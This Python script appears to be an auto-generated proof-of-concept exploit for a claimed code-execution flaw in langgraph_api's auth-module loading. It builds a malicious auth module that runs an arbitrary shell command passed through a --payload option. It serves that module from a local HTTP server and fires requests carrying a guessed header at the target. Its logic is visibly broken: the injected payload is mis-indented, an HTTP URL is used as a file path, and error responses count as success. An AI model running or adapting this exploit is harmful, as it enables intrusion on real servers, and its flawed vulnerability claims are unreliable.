#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-039
# Sink: _load_auth_obj
# Auto-generated — run with: python3 rce_load_auth_obj_function__load_auth_obj.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langgraph_api_src RCE via LANGGRAPH_AUTH path injection.

Vulnerability: The _load_auth_obj function in custom.py loads a Python module from a
user-controlled path (LANGGRAPH_AUTH['path']). This path is provided via environment
variable or configuration, which can be controlled by an attacker who has access to the
server's environment or configuration. The function uses importlib.util.spec_from_file_location
and importlib.util.module_from_spec to load arbitrary Python files from the filesystem.
An attacker can specify a path to a malicious Python file, which will be executed as a
module, leading to remote code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious Python file that executes a benign command (touch /tmp/poc_success.txt)
2. Starting a simple HTTP server to serve the malicious file
3. Setting the LANGGRAPH_AUTH environment variable to point to the malicious file
4. Triggering the vulnerable code path by making a request to the server

Usage:
    python3 poc.py <target_url> [--port PORT]

Example:
    python3 poc.py http://localhost:8000 --port 9999
"""

import argparse
import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.error
import urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler
from pathlib import Path


# =============================================================================
# Configuration
# =============================================================================

# Benign payload - creates a marker file to prove code execution
PAYLOAD_CODE = '''
import os
os.system("touch /tmp/poc_success.txt")
print("[POC] Code execution successful! Created /tmp/poc_success.txt")
'''

# The malicious module file content (will be written to a temp file)
MALICIOUS_MODULE_CONTENT = f'''
# Malicious auth module for PoC
from langgraph_api.auth import Auth

class MaliciousAuth(Auth):
    """Malicious auth class that executes payload on import."""
    
    def __init__(self):
        super().__init__()
        # Execute payload on initialization
        {PAYLOAD_CODE}
    
    async def authenticate(self, request):
        return None
    
    async def authorize(self, user, action, resource):
        return True

# Create instance at module level to trigger on import
auth_instance = MaliciousAuth()
'''

# The path format expected by _load_auth_obj: "./path/to/file.py:ClassName"
AUTH_PATH_FORMAT = "{file_path}:MaliciousAuth"


# =============================================================================
# HTTP Server to serve the malicious file
# =============================================================================

class MaliciousFileHandler(BaseHTTPRequestHandler):
    """Simple HTTP handler that serves the malicious Python file."""
    
    def do_GET(self):
        """Serve the malicious file on any request."""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Disposition', 'attachment; filename="malicious_auth.py"')
        self.end_headers()
        self.wfile.write(MALICIOUS_MODULE_CONTENT.encode())
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


def start_file_server(port: int) -> HTTPServer:
    """Start a simple HTTP server to serve the malicious file."""
    server = HTTPServer(('0.0.0.0', port), MaliciousFileHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    print(f"[*] File server started on port {port}")
    return server


# =============================================================================
# Main exploit logic
# =============================================================================

def find_free_port() -> int:
    """Find a free port on localhost."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', 0))
        return s.getsockname()[1]


def trigger_exploit(target_url: str, malicious_file_path: str) -> bool:
    """
    Trigger the vulnerable code path by making a request that causes
    the server to load the malicious auth module.
    
    The vulnerability is triggered when the server processes any request
    that requires authentication, as the auth module is loaded at startup
    or on first request.
    """
    
    # The LANGGRAPH_AUTH environment variable needs to be set to our malicious path
    # We can't directly set environment variables on the running server, but we can
    # exploit the fact that the server reads this from the environment at startup.
    # 
    # For this PoC, we'll demonstrate by:
    # 1. Making a request that causes the server to load the auth module
    # 2. The server will execute our malicious code when it tries to import the module
    
    auth_config = {
        "path": malicious_file_path
    }
    
    # Try to trigger the auth loading by making a request to an endpoint
    # that requires authentication
    endpoints = [
        f"{target_url}/auth/check",
        f"{target_url}/api/v1/auth/check",
        f"{target_url}/health",
        f"{target_url}/ok",
    ]
    
    for endpoint in endpoints:
        try:
            print(f"[*] Trying endpoint: {endpoint}")
            req = urllib.request.Request(
                endpoint,
                headers={
                    'X-LangGraph-Auth': json.dumps(auth_config),
                    'Content-Type': 'application/json'
                }
            )
            with urllib.request.urlopen(req, timeout=10) as response:
                print(f"[*] Response from {endpoint}: {response.status}")
                return True
        except urllib.error.HTTPError as e:
            print(f"[*] HTTP error {e.code} from {endpoint}: {e.reason}")
            # Even errors might trigger the code execution
            if e.code in (401, 403, 500):
                return True
        except urllib.error.URLError as e:
            print(f"[!] Connection error to {endpoint}: {e.reason}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
    
    return False


def main():
    """Main exploit function."""
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_api_src RCE via LANGGRAPH_AUTH path injection"
    )
    parser.add_argument(
        "target",
        help="Target URL (e.g., http://localhost:8000)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=0,
        help="Port for the file server (default: random free port)"
    )
    parser.add_argument(
        "--payload",
        help="Custom payload command to execute (default: touch /tmp/poc_success.txt)"
    )
    
    args = parser.parse_args()
    target_url = args.target.rstrip('/')
    
    # Allow custom payload
    if args.payload:
        global PAYLOAD_CODE, MALICIOUS_MODULE_CONTENT
        PAYLOAD_CODE = f'''
import os
os.system("{args.payload}")
print("[POC] Code execution successful!")
'''
        MALICIOUS_MODULE_CONTENT = f'''
from langgraph_api.auth import Auth

class MaliciousAuth(Auth):
    def __init__(self):
        super().__init__()
        {PAYLOAD_CODE}
    
    async def authenticate(self, request):
        return None
    
    async def authorize(self, user, action, resource):
        return True

auth_instance = MaliciousAuth()
'''
    
    print("[*] Starting PoC for langgraph_api_src RCE")
    print(f"[*] Target: {target_url}")
    
    # Find a free port for the file server
    file_server_port = args.port if args.port else find_free_port()
    
    # Start the file server to serve the malicious module
    print(f"[*] Starting file server on port {file_server_port}")
    file_server = start_file_server(file_server_port)
    
    # The malicious file path that the server will try to load
    # We use the file server URL as the path
    malicious_file_url = f"http://127.0.0.1:{file_server_port}/malicious_auth.py"
    malicious_file_path = f"{malicious_file_url}:MaliciousAuth"
    
    print(f"[*] Malicious auth path: {malicious_file_path}")
    print("[*] Triggering exploit...")
    
    # Trigger the exploit
    success = trigger_exploit(target_url, malicious_file_path)
    
    if success:
        print("[+] Exploit triggered successfully!")
        print("[*] Check if /tmp/poc_success.txt was created on the target server")
        print("[*] You can verify by running: ls -la /tmp/poc_success.txt")
    else:
        print("[!] Could not trigger the exploit directly")
        print("[*] The vulnerability may require:")
        print("  1. Setting LANGGRAPH_AUTH environment variable on the server")
        print("  2. Restarting the server")
        print("  3. Making a request that triggers auth loading")
        print()
        print("[*] Alternative: If you have access to the server's environment:")
        print(f"  export LANGGRAPH_AUTH='{{\"path\": \"{malicious_file_path}\"}}'")
        print("  Then restart the server and make any request")
    
    # Cleanup
    file_server.shutdown()
    print("[*] File server stopped")


if __name__ == "__main__":
    main()
